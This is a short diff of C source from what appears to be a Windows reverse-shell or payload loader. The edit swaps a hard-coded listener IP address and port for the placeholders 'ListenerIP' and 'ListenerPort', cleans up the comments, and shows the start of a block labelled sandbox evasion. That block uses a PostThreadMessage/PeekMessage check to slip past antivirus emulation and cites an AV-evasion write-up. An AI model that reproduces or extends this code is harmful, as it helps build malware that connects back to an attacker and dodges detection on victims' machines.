@@ -103,15 +103,15 @@ int main(int argc) {
 	winsock_init();
 	char argv[3][25];
 
-	//this program was ment to be run from the command line, so i added this shit so it would work
-	strcpy(argv[1],"10.1.225.101");
-	strcpy(argv[2],"4445");
+	//this program was meant to be run from the command line, so i added this so it would work
+	strcpy(argv[1],"ListenerIP");
+	strcpy(argv[2],"ListenerPort");
 
 	//================================
 	//begin sandbox evasssioooooon
 	MSG msg;
 	DWORD tc;
-	//check to see if the application is fully loaded, aparently AV hates peekmessage
+	//check to see if the application is fully loaded, apparently AV hates peekmessage
 	//see this post for more info http://schierlm.users.sourceforge.net/avevasion.html
 	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
 	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
